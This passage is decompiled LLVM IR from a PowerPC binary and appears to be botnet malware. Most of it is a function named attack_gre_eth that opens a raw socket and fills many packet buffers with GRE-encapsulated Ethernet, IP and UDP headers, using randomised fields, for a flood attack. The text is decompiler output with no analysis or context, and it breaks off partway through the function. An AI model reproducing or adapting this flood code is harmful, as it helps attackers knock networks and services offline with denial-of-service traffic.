  uselistorder label %dec_label_pc_10001f5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10001ef8, { 1, 0 }
  uselistorder label %dec_label_pc_10001e78, { 1, 0 }
  uselistorder label %dec_label_pc_10001c9c, { 1, 0 }
  uselistorder label %dec_label_pc_10001c6c, { 1, 0 }
  uselistorder label %dec_label_pc_10001c60, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_10001c20, { 1, 0 }
  uselistorder label %dec_label_pc_10001b70, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10001b50, { 1, 0 }
  uselistorder label %dec_label_pc_10001b20, { 1, 0 }
  uselistorder label %dec_label_pc_10001ae4, { 1, 0 }
  uselistorder label %dec_label_pc_10001aa8, { 1, 0 }
  uselistorder label %dec_label_pc_10001a6c, { 1, 0 }
  uselistorder label %dec_label_pc_10001a40, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001a20, { 1, 0 }
  uselistorder label %dec_label_pc_1000199c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10001958, { 1, 0 }
  uselistorder label %dec_label_pc_100018cc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10001888, { 1, 0 }
  uselistorder label %dec_label_pc_100017fc, { 1, 0 }
  uselistorder label %dec_label_pc_100017d0, { 1, 0 }
  uselistorder label %dec_label_pc_10001780, { 1, 0 }
  uselistorder label %dec_label_pc_100016f8, { 1, 0 }
  uselistorder label %dec_label_pc_100015c0, { 1, 0 }
  uselistorder label %dec_label_pc_100015c0.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_10001584, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_10001564, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000141c, { 1, 0 }
  uselistorder label %dec_label_pc_10001404, { 1, 0 }
  uselistorder label %dec_label_pc_100013d8, { 1, 0 }
  uselistorder label %dec_label_pc_10001374, { 1, 0 }
  uselistorder label %dec_label_pc_1000133c, { 1, 0 }
  uselistorder label %dec_label_pc_100010c8, { 1, 0 }
  uselistorder label %dec_label_pc_10001038, { 7, 8, 9, 10, 11, 12, 13, 1, 14, 2, 15, 16, 6, 17, 18, 0, 5, 3, 4 }
  uselistorder label %dec_label_pc_10001008, { 1, 0 }
  uselistorder label %dec_label_pc_10000ee8, { 1, 0 }
  uselistorder label %dec_label_pc_10000ec4, { 1, 0 }
  uselistorder label %dec_label_pc_10000ea0, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_10000df8, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_10000d94, { 1, 0 }
  uselistorder label %dec_label_pc_10000d4c, { 1, 0 }
  uselistorder label %dec_label_pc_10000c40, { 1, 0 }
  uselistorder label %dec_label_pc_10000c0c, { 1, 0 }
}

define i32 @attack_gre_eth(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr2_eq.global-to-local = alloca i1, align 1
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-106 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %v0_1000253c = load i32, i32* @lr, align 4
  store i32 %v0_1000253c, i32* %r0.global-to-local, align 4
  %v0_10002540 = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r18.global-to-local, align 4
  store i32 0, i32* %r19.global-to-local, align 4
  store i32 %v0_10002540, i32* @r27, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v0_10002564 = load i32, i32* %r0.global-to-local, align 4
  %v0_1000257c = load i32, i32* @r21, align 4
  %v0_10002584 = load i32, i32* @r23, align 4
  %v0_10002588 = load i32, i32* @r24, align 4
  store i32 %arg3, i32* @r26, align 4
  store i32 %arg4, i32* @r28, align 4
  %v0_100025a0 = load i32, i32* @r29, align 4
  store i32 %arg5, i32* %r29.global-to-local, align 4
  %v0_100025a8 = load i32, i32* @r30, align 4
  %v0_100025ac = load i32, i32* @r31, align 4
  store i32 0, i32* %stack_var_-120, align 4
  store i32 268445116, i32* @lr, align 4
  %v2_100025b8 = call i32 @calloc(i32 %arg2, i32 4)
  store i32 %v2_100025b8, i32* @r22, align 4
  %v0_100025c0 = load i32, i32* @r29, align 4
  %v0_100025cc = load i32, i32* @r28, align 4
  store i32 %v0_100025cc, i32* %r3.global-to-local, align 4
  store i32 268445140, i32* @lr, align 4
  %v4_100025d0 = inttoptr i32 %v0_100025c0 to i32*
  %v5_100025d0 = call i32 @attack_get_opt_int(i32 %v0_100025cc, i32* %v4_100025d0, i32 2, i32 0)
  %v0_100025e0 = load i32, i32* @r29, align 4
  %v1_100025e4 = urem i32 %v5_100025d0, 256
  store i32 %v1_100025e4, i32* %r15.global-to-local, align 4
  %v0_100025e8 = load i32, i32* @r28, align 4
  store i32 %v0_100025e8, i32* %r3.global-to-local, align 4
  store i32 268445168, i32* @lr, align 4
  %v4_100025ec = inttoptr i32 %v0_100025e0 to i32*
  %v5_100025ec = call i32 @attack_get_opt_int(i32 %v0_100025e8, i32* %v4_100025ec, i32 3, i32 65535)
  %v0_100025f0 = load i32, i32* @r29, align 4
  store i32 %v5_100025ec, i32* %r21.global-to-local, align 4
  %v0_10002600 = load i32, i32* @r28, align 4
  store i32 %v0_10002600, i32* %r3.global-to-local, align 4
  store i32 268445192, i32* @lr, align 4
  %v4_10002604 = inttoptr i32 %v0_100025f0 to i32*
  %v5_10002604 = call i32 @attack_get_opt_int(i32 %v0_10002600, i32* %v4_10002604, i32 4, i32 64)
  %v0_10002608 = load i32, i32* @r29, align 4
  %v1_10002614 = urem i32 %v5_10002604, 256
  store i32 %v1_10002614, i32* %r20.global-to-local, align 4
  %v0_10002618 = load i32, i32* @r28, align 4
  store i32 %v0_10002618, i32* %r3.global-to-local, align 4
  store i32 268445216, i32* @lr, align 4
  %v4_1000261c = inttoptr i32 %v0_10002608 to i32*
  %v5_1000261c = call i32 @attack_get_opt_int(i32 %v0_10002618, i32* %v4_1000261c, i32 5, i32 1)
  %v0_1000262c = load i32, i32* @r29, align 4
  %v1_10002630 = urem i32 %v5_1000261c, 256
  store i32 %v1_10002630, i32* %r23.global-to-local, align 4
  %v0_10002634 = load i32, i32* @r28, align 4
  store i32 %v0_10002634, i32* %r3.global-to-local, align 4
  store i32 268445244, i32* @lr, align 4
  %v4_10002638 = inttoptr i32 %v0_1000262c to i32*
  %v5_10002638 = call i32 @attack_get_opt_int(i32 %v0_10002634, i32* %v4_10002638, i32 6, i32 65535)
  %v0_10002640 = load i32, i32* @r29, align 4
  store i32 %v5_10002638, i32* %r24.global-to-local, align 4
  %v0_10002650 = load i32, i32* @r28, align 4
  store i32 %v0_10002650, i32* %r3.global-to-local, align 4
  store i32 268445272, i32* @lr, align 4
  %v4_10002654 = inttoptr i32 %v0_10002640 to i32*
  %v5_10002654 = call i32 @attack_get_opt_int(i32 %v0_10002650, i32* %v4_10002654, i32 7, i32 65535)
  %v0_10002658 = load i32, i32* @r29, align 4
  store i32 %v5_10002654, i32* %r30.global-to-local, align 4
  %v0_10002668 = load i32, i32* @r28, align 4
  store i32 %v0_10002668, i32* %r3.global-to-local, align 4
  store i32 268445296, i32* @lr, align 4
  %v4_1000266c = inttoptr i32 %v0_10002658 to i32*
  %v5_1000266c = call i32 @attack_get_opt_int(i32 %v0_10002668, i32* %v4_1000266c, i32 0, i32 512)
  %v0_10002670 = load i32, i32* @r29, align 4
  store i32 %v5_1000266c, i32* %r17.global-to-local, align 4
  %v0_10002680 = load i32, i32* @r28, align 4
  store i32 %v0_10002680, i32* %r3.global-to-local, align 4
  store i32 268445320, i32* @lr, align 4
  %v4_10002684 = inttoptr i32 %v0_10002670 to i32*
  %v5_10002684 = call i32 @attack_get_opt_int(i32 %v0_10002680, i32* %v4_10002684, i32 1, i32 1)
  %v0_10002688 = load i32, i32* @r29, align 4
  %v1_1000268c = urem i32 %v5_10002684, 256
  %v0_1000269c = load i32, i32* @r28, align 4
  store i32 %v0_1000269c, i32* %r3.global-to-local, align 4
  store i32 268445348, i32* @lr, align 4
  %v4_100026a0 = inttoptr i32 %v0_10002688 to i32*
  %v5_100026a0 = call i32 @attack_get_opt_int(i32 %v0_1000269c, i32* %v4_100026a0, i32 18, i32 0)
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_100026a8 = load i32, i32* @global_var_100211e0.76, align 4
  %v0_100026ac = load i32, i32* @r29, align 4
  store i32 %v5_100026a0, i32* %r31.global-to-local, align 4
  %v0_100026b8 = load i32, i32* @r28, align 4
  store i32 %v0_100026b8, i32* %r3.global-to-local, align 4
  store i32 268445376, i32* @lr, align 4
  %v4_100026bc = inttoptr i32 %v0_100026ac to i32*
  %v5_100026bc = call i32 @attack_get_opt_int(i32 %v0_100026b8, i32* %v4_100026bc, i32 24, i32 %v3_100026a8)
  store i32 %v5_100026bc, i32* %r14.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_100026c8 = call i32 @__GI_time()
  %v1_100026d0 = load i32, i32* @r27, align 4
  %v2_100026d0 = add i32 %v1_100026d0, %v0_100026c8
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268445412, i32* @lr, align 4
  %v3_100026e0 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_100026e0, i32* %r3.global-to-local, align 4
  %v3_100026e4 = icmp eq i32 %v3_100026e0, -1
  store i1 %v3_100026e4, i1* %cr7_eq.global-to-local, align 1
  store i32 %v3_100026e0, i32* @r25, align 4
  br i1 %v3_100026e4, label %dec_label_pc_10002a78, label %dec_label_pc_100026f0

dec_label_pc_100026f0:                            ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_100026fc = ptrtoint i32* %stack_var_-120 to i32
  store i32 1, i32* %stack_var_-120, align 4
  store i32 268445452, i32* @lr, align 4
  %v5_10002708 = call i32 @__GI_setsockopt(i32 0, i32 3, i32 %v2_100026fc, i32 4, i32 4)
  store i32 %v5_10002708, i32* %r3.global-to-local, align 4
  %v3_1000270c = icmp eq i32 %v5_10002708, -1
  store i1 %v3_1000270c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000270c, label %dec_label_pc_10002b88, label %dec_label_pc_10002714

dec_label_pc_10002714:                            ; preds = %dec_label_pc_100026f0
  %v0_10002714 = load i32, i32* %r18.global-to-local, align 4
  %v3_10002714 = icmp eq i32 %v0_10002714, 0
  store i1 %v3_10002714, i1* %cr7_eq.global-to-local, align 1
  %v0_10002718 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002718 = urem i32 %v0_10002718, 256
  store i32 %v1_10002718, i32* %r31.global-to-local, align 4
  %v0_1000271c = load i32, i32* %r19.global-to-local, align 4
  store i32 %v0_1000271c, i32* %stack_var_-120, align 4
  %v0_10002720 = load i32, i32* %r21.global-to-local, align 4
  %v1_10002720 = urem i32 %v0_10002720, 65536
  store i32 %v1_10002720, i32* @r28, align 4
  %v0_10002724 = call i32 @__asm_mfcr()
  store i32 %v0_10002724, i32* %r3.global-to-local, align 4
  %v1_10002728 = mul i32 %v0_10002724, 268435456
  store i32 %v1_10002728, i32* %r0.global-to-local, align 4
  %v0_1000272c = load i32, i32* %r24.global-to-local, align 4
  %v1_1000272c = urem i32 %v0_1000272c, 65536
  store i32 %v1_1000272c, i32* %r16.global-to-local, align 4
  %v0_10002730 = load i32, i32* %r30.global-to-local, align 4
  %v1_10002730 = urem i32 %v0_10002730, 65536
  store i32 %v1_10002730, i32* %r19.global-to-local, align 4
  %v0_10002734 = load i32, i32* %r31.global-to-local, align 4
  %v0_1000273c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000273c, label %dec_label_pc_10002898, label %dec_label_pc_10002740

dec_label_pc_10002740:                            ; preds = %dec_label_pc_10002714
  %v0_10002740 = load i32, i32* %r23.global-to-local, align 4
  %v3_10002740 = icmp eq i32 %v0_10002740, 0
  store i1 %v3_10002740, i1* %cr4_eq.global-to-local, align 1
  %v3_10002744 = icmp eq i32 %v0_10002734, 0
  store i1 %v3_10002744, i1* %cr3_eq.global-to-local, align 1
  %v0_10002748 = load i32, i32* %r17.global-to-local, align 4
  %v1_10002748 = urem i32 %v0_10002748, 65536
  %v0_1000274c = load i32, i32* @r28, align 4
  %v1_1000274c = sub i32 -1, %v0_1000274c
  store i32 %v1_1000274c, i32* %r11.global-to-local, align 4
  %v1_10002750 = add nuw nsw i32 %v1_10002748, 8
  store i32 %v1_10002750, i32* %r10.global-to-local, align 4
  %v1_10002754 = add nuw nsw i32 %v1_10002748, 66
  store i32 %v1_10002754, i32* %r0.global-to-local, align 4
  %v1_10002758 = add nuw nsw i32 %v1_10002748, 28
  store i32 %v1_10002758, i32* %r9.global-to-local, align 4
  %fold = add i32 %v0_10002748, 66
  %v1_1000275c = urem i32 %fold, 65536
  store i32 %v1_1000275c, i32* @r21, align 4
  %fold4 = add i32 %v0_10002748, 28
  %v1_10002760 = urem i32 %fold4, 65536
  store i32 %v1_10002760, i32* @r23, align 4
  %v1_10002764 = urem i32 %v1_1000274c, 65536
  store i32 %v1_10002764, i32* @r24, align 4
  %fold5 = add i32 %v0_10002748, 8
  %v1_10002768 = urem i32 %fold5, 65536
  store i32 %v1_10002768, i32* @r27, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000279c

dec_label_pc_10002774:                            ; preds = %dec_label_pc_10002858
  %v0_10002774 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002774 = add i32 %v0_10002774, 16
  %v2_10002774 = inttoptr i32 %v1_10002774 to i32*
  %v3_10002774 = load i32, i32* %v2_10002774, align 4
  store i32 %v3_10002774, i32* %r0.global-to-local, align 4
  %v0_10002778 = load i32, i32* @r27, align 4
  %v1_10002778 = trunc i32 %v0_10002778 to i16
  %v2_10002778 = load i32, i32* %r29.global-to-local, align 4
  %v3_10002778 = add i32 %v2_10002778, 4
  %v4_10002778 = inttoptr i32 %v3_10002778 to i16*
  store i16 %v1_10002778, i16* %v4_10002778, align 2
  %v0_1000277c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000277c = load i32, i32* %r30.global-to-local, align 4
  %v2_1000277c = add i32 %v1_1000277c, 16
  %v3_1000277c = inttoptr i32 %v2_1000277c to i32*
  store i32 %v0_1000277c, i32* %v3_1000277c, align 4
  %v0_10002780 = load i32, i32* %r16.global-to-local, align 4
  %v1_10002780 = trunc i32 %v0_10002780 to i16
  %v2_10002780 = load i32, i32* %r29.global-to-local, align 4
  %v3_10002780 = inttoptr i32 %v2_10002780 to i16*
  store i16 %v1_10002780, i16* %v3_10002780, align 2
  %v3_10002784 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10002784, i32* %r9.global-to-local, align 4
  %v0_10002788 = load i32, i32* %r19.global-to-local, align 4
  %v1_10002788 = trunc i32 %v0_10002788 to i16
  %v2_10002788 = load i32, i32* %r29.global-to-local, align 4
  %v3_10002788 = add i32 %v2_10002788, 2
  %v4_10002788 = inttoptr i32 %v3_10002788 to i16*
  store i16 %v1_10002788, i16* %v4_10002788, align 2
  %v0_1000278c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000278c = add i32 %v0_1000278c, 1
  store i32 %v1_1000278c, i32* %r31.global-to-local, align 4
  %v1_10002790 = load i32, i32* %r18.global-to-local, align 4
  %v2_10002790 = icmp slt i32 %v1_1000278c, %v1_10002790
  %v4_10002790 = icmp eq i32 %v1_1000278c, %v1_10002790
  store i1 %v4_10002790, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_1000278c, i32* %stack_var_-120, align 4
  br i1 %v2_10002790, label %dec_label_pc_1000279c, label %dec_label_pc_10002898.loopexit

dec_label_pc_1000279c:                            ; preds = %dec_label_pc_10002774, %dec_label_pc_10002874, %dec_label_pc_10002740
  store i32 1510, i32* %r3.global-to-local, align 4
  store i32 268445608, i32* @lr, align 4
  %v2_100027a4 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_100027a4, i32* %r3.global-to-local, align 4
  %v3_100027a8 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_100027a8, i32* %r9.global-to-local, align 4
  %v0_100027ac = load i32, i32* @r31, align 4
  %v1_100027ac = mul i32 %v0_100027ac, 4
  store i32 %v1_100027ac, i32* %r11.global-to-local, align 4
  %v2_100027b4 = load i32, i32* @r22, align 4
  %v3_100027b4 = add i32 %v2_100027b4, %v1_100027ac
  %v4_100027b4 = inttoptr i32 %v3_100027b4 to i32*
  store i32 %v2_100027a4, i32* %v4_100027b4, align 4
  %v0_100027b8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100027b8 = mul i32 %v0_100027b8, 4
  store i32 %v1_100027b8, i32* %r0.global-to-local, align 4
  %v1_100027c0 = mul i32 %v0_100027b8, 24
  store i32 %v1_100027c0, i32* %r9.global-to-local, align 4
  %v0_100027c4 = load i32, i32* @r22, align 4
  %v2_100027c4 = add i32 %v0_100027c4, %v1_100027b8
  %v3_100027c4 = inttoptr i32 %v2_100027c4 to i32*
  %v4_100027c4 = load i32, i32* %v3_100027c4, align 4
  store i32 %v4_100027c4, i32* %r31.global-to-local, align 4
  %v1_100027c8 = load i32, i32* @r26, align 4
  %v2_100027c8 = add i32 %v1_100027c8, %v1_100027c0
  store i32 %v2_100027c8, i32* %r8.global-to-local, align 4
  %v1_100027cc = inttoptr i32 %v4_100027c4 to i32*
  %v2_100027cc = load i32, i32* %v1_100027cc, align 4
  store i32 %v2_100027cc, i32* %r0.global-to-local, align 4
  %v1_100027d0 = add i32 %v4_100027c4, 38
  store i32 %v1_100027d0, i32* %r30.global-to-local, align 4
  %v0_100027d4 = load i32, i32* %r20.global-to-local, align 4
  %v1_100027d4 = trunc i32 %v0_100027d4 to i8
  %v3_100027d4 = add i32 %v4_100027c4, 8
  %v4_100027d4 = inttoptr i32 %v3_100027d4 to i8*
  store i8 %v1_100027d4, i8* %v4_100027d4, align 1
  %v0_100027d8 = load i32, i32* %r31.global-to-local, align 4
  %v1_100027d8 = add i32 %v0_100027d8, 58
  store i32 %v1_100027d8, i32* %r29.global-to-local, align 4
  %v1_100027dc = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_100027dc, i32* %r0.global-to-local, align 4
  %v0_100027e0 = load i32, i32* @r28, align 4
  %v1_100027e0 = trunc i32 %v0_100027e0 to i16
  %v2_100027e0 = load i32, i32* %r31.global-to-local, align 4
  %v3_100027e0 = add i32 %v2_100027e0, 4
  %v4_100027e0 = inttoptr i32 %v3_100027e0 to i16*
  store i16 %v1_100027e0, i16* %v4_100027e0, align 2
  %v1_100027e4 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_100027e4, i32* %r0.global-to-local, align 4
  %v0_100027e8 = load i32, i32* %r31.global-to-local, align 4
  %v1_100027e8 = add i32 %v0_100027e8, 20
  store i32 %v1_100027e8, i32* %r10.global-to-local, align 4
  %v2_100027ec = inttoptr i32 %v0_100027e8 to i32*
  store i32 %v1_100027e4, i32* %v2_100027ec, align 4
  %v0_100027f0 = load i32, i32* %r31.global-to-local, align 4
  %v1_100027f0 = add i32 %v0_100027f0, 24
  store i32 %v1_100027f0, i32* %r11.global-to-local, align 4
  %v0_100027f4 = load i32, i32* %r15.global-to-local, align 4
  %v1_100027f4 = trunc i32 %v0_100027f4 to i8
  %v3_100027f4 = add i32 %v0_100027f0, 1
  %v4_100027f4 = inttoptr i32 %v3_100027f4 to i8*
  store i8 %v1_100027f4, i8* %v4_100027f4, align 1
  %v0_100027f8 = load i32, i32* @r21, align 4
  %v1_100027f8 = trunc i32 %v0_100027f8 to i16
  %v2_100027f8 = load i32, i32* %r31.global-to-local, align 4
  %v3_100027f8 = add i32 %v2_100027f8, 2
  %v4_100027f8 = inttoptr i32 %v3_100027f8 to i16*
  store i16 %v1_100027f8, i16* %v4_100027f8, align 2
  %v0_100027fc = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_100027fc, label %dec_label_pc_10002808, label %dec_label_pc_10002800

dec_label_pc_10002800:                            ; preds = %dec_label_pc_1000279c
  store i32 16384, i32* %r0.global-to-local, align 4
  %v2_10002804 = load i32, i32* %r31.global-to-local, align 4
  %v3_10002804 = add i32 %v2_10002804, 6
  %v4_10002804 = inttoptr i32 %v3_10002804 to i16*
  store i16 16384, i16* %v4_10002804, align 2
  br label %dec_label_pc_10002808

dec_label_pc_10002808:                            ; preds = %dec_label_pc_1000279c, %dec_label_pc_10002800
  store i32 25944, i32* %r9.global-to-local, align 4
  %v2_10002810 = load i32, i32* %r31.global-to-local, align 4
  %v3_10002810 = add i32 %v2_10002810, 9
  %v4_10002810 = inttoptr i32 %v3_10002810 to i8*
  store i8 47, i8* %v4_10002810, align 1
  store i32 2048, i32* %r0.global-to-local, align 4
  %v0_10002818 = load i32, i32* %r9.global-to-local, align 4
  %v1_10002818 = trunc i32 %v0_10002818 to i16
  %v2_10002818 = load i32, i32* %r10.global-to-local, align 4
  %v3_10002818 = add i32 %v2_10002818, 2
  %v4_10002818 = inttoptr i32 %v3_10002818 to i16*
  store i16 %v1_10002818, i16* %v4_10002818, align 2
  %v0_1000281c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000281c = trunc i32 %v0_1000281c to i16
  %v2_1000281c = load i32, i32* %r11.global-to-local, align 4
  %v3_1000281c = add i32 %v2_1000281c, 12
  %v4_1000281c = inttoptr i32 %v3_1000281c to i16*
  store i16 %v1_1000281c, i16* %v4_1000281c, align 2
  %v0_10002820 = load i32, i32* %r14.global-to-local, align 4
  %v1_10002820 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002820 = add i32 %v1_10002820, 12
  %v3_10002820 = inttoptr i32 %v2_10002820 to i32*
  store i32 %v0_10002820, i32* %v3_10002820, align 4
  %v0_10002824 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002824 = add i32 %v0_10002824, 38
  %v2_10002824 = inttoptr i32 %v1_10002824 to i32*
  %v3_10002824 = load i32, i32* %v2_10002824, align 4
  store i32 %v3_10002824, i32* %r0.global-to-local, align 4
  %v0_10002828 = load i32, i32* %r8.global-to-local, align 4
  %v1_10002828 = add i32 %v0_10002828, 16
  %v2_10002828 = inttoptr i32 %v1_10002828 to i32*
  %v3_10002828 = load i32, i32* %v2_10002828, align 4
  store i32 %v3_10002828, i32* %r9.global-to-local, align 4
  %v1_1000282c = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_1000282c, i32* %r0.global-to-local, align 4
  %v1_10002830 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10002830, i32* %r0.global-to-local, align 4
  %v1_10002834 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002834 = add i32 %v1_10002834, 16
  %v3_10002834 = inttoptr i32 %v2_10002834 to i32*
  store i32 %v3_10002828, i32* %v3_10002834, align 4
  %v1_10002838 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002838 = add i32 %v1_10002838, 38
  %v3_10002838 = inttoptr i32 %v2_10002838 to i32*
  store i32 %v1_10002830, i32* %v3_10002838, align 4
  %v0_1000283c = load i32, i32* %r15.global-to-local, align 4
  %v1_1000283c = trunc i32 %v0_1000283c to i8
  %v2_1000283c = load i32, i32* %r30.global-to-local, align 4
  %v3_1000283c = add i32 %v2_1000283c, 1
  %v4_1000283c = inttoptr i32 %v3_1000283c to i8*
  store i8 %v1_1000283c, i8* %v4_1000283c, align 1
  %v0_10002840 = load i32, i32* @r23, align 4
  %v1_10002840 = trunc i32 %v0_10002840 to i16
  %v2_10002840 = load i32, i32* %r30.global-to-local, align 4
  %v3_10002840 = add i32 %v2_10002840, 2
  %v4_10002840 = inttoptr i32 %v3_10002840 to i16*
  store i16 %v1_10002840, i16* %v4_10002840, align 2
  %v0_10002844 = load i32, i32* @r24, align 4
  %v1_10002844 = trunc i32 %v0_10002844 to i16
  %v2_10002844 = load i32, i32* %r30.global-to-local, align 4
  %v3_10002844 = add i32 %v2_10002844, 4
  %v4_10002844 = inttoptr i32 %v3_10002844 to i16*
  store i16 %v1_10002844, i16* %v4_10002844, align 2
  %v0_10002848 = load i32, i32* %r20.global-to-local, align 4
  %v1_10002848 = trunc i32 %v0_10002848 to i8
  %v2_10002848 = load i32, i32* %r30.global-to-local, align 4
  %v3_10002848 = add i32 %v2_10002848, 8
  %v4_10002848 = inttoptr i32 %v3_10002848 to i8*
  store i8 %v1_10002848, i8* %v4_10002848, align 1
  %v0_1000284c = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000284c, label %dec_label_pc_10002858, label %dec_label_pc_10002850

dec_label_pc_10002850:                            ; preds = %dec_label_pc_10002808
  store i32 16384, i32* %r0.global-to-local, align 4
  %v2_10002854 = load i32, i32* %r30.global-to-local, align 4
  %v3_10002854 = add i32 %v2_10002854, 6
  %v4_10002854 = inttoptr i32 %v3_10002854 to i16*
  store i16 16384, i16* %v4_10002854, align 2
  br label %dec_label_pc_10002858

dec_label_pc_10002858:                            ; preds = %dec_label_pc_10002808, %dec_label_pc_10002850
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_1000285c = load i32, i32* %r30.global-to-local, align 4
  %v3_1000285c = add i32 %v2_1000285c, 9
  %v4_1000285c = inttoptr i32 %v3_1000285c to i8*
  store i8 17, i8* %v4_1000285c, align 1
  %v0_10002860 = call i32 @rand_next()
  store i32 %v0_10002860, i32* %r3.global-to-local, align 4
  %v1_10002864 = add i32 %v0_10002860, -1024
  store i32 %v1_10002864, i32* %r0.global-to-local, align 4
  %v1_10002868 = load i32, i32* %r30.global-to-local, align 4
  %v2_10002868 = add i32 %v1_10002868, 12
  %v3_10002868 = inttoptr i32 %v2_10002868 to i32*
  store i32 %v0_10002860, i32* %v3_10002868, align 4
  %v0_1000286c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000286c = sub i32 -1, %v0_1000286c
  store i32 %v1_1000286c, i32* %r0.global-to-local, align 4
  %v0_10002870 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10002870, label %dec_label_pc_10002874, label %dec_label_pc_10002774

dec_label_pc_10002874:                            ; preds = %dec_label_pc_10002858
  %v1_10002874 = load i32, i32* %r30.global-to-local, align 4
  %v2_10002874 = add i32 %v1_10002874, 16
  %v3_10002874 = inttoptr i32 %v2_10002874 to i32*
  store i32 %v1_1000286c, i32* %v3_10002874, align 4
  %v0_10002878 = load i32, i32* @r27, align 4
  %v1_10002878 = trunc i32 %v0_10002878 to i16
  %v2_10002878 = load i32, i32* %r29.global-to-local, align 4
  %v3_10002878 = add i32 %v2_10002878, 4
  %v4_10002878 = inttoptr i32 %v3_10002878 to i16*
  store i16 %v1_10002878, i16* %v4_10002878, align 2
  %v3_1000287c = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000287c, i32* %r9.global-to-local, align 4
  %v0_10002880 = load i32, i32* %r16.global-to-local, align 4
  %v1_10002880 = trunc i32 %v0_10002880 to i16
  %v2_10002880 = load i32, i32* %r29.global-to-local, align 4
  %v3_10002880 = inttoptr i32 %v2_10002880 to i16*
  store i16 %v1_10002880, i16* %v3_10002880, align 2
  %v0_10002884 = load i32, i32* %r9.global-to-local, align 4
  %v1_10002884 = add i32 %v0_10002884, 1
  store i32 %v1_10002884, i32* %r31.global-to-local, align 4
  %v0_10002888 = load i32, i32* %r19.global-to-local, align 4
  %v1_10002888 = trunc i32 %v0_10002888 to i16
  %v2_10002888 = load i32, i32* %r29.global-to-local, align 4
  %v3_10002888 = add i32 %v2_10002888, 2
  %v4_10002888 = inttoptr i32 %v3_10002888 to i16*
  store i16 %v1_10002888, i16* %v4_10002888, align 2
  %v0_1000288c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000288c = load i32, i32* %r18.global-to-local, align 4
  %v2_1000288c = icmp slt i32 %v0_1000288c, %v1_1000288c
  %v4_1000288c = icmp eq i32 %v0_1000288c, %v1_1000288c
  store i1 %v4_1000288c, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_1000288c, i32* %stack_var_-120, align 4
  br i1 %v2_1000288c, label %dec_label_pc_1000279c, label %dec_label_pc_10002898.loopexit

dec_label_pc_10002898.loopexit:                   ; preds = %dec_label_pc_10002874, %dec_label_pc_10002774
  %v0_100028a8.pre = load i32, i32* %r19.global-to-local, align 4
  %v0_100028b0.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_10002898

dec_label_pc_10002898:                            ; preds = %dec_label_pc_10002898.loopexit, %dec_label_pc_10002714
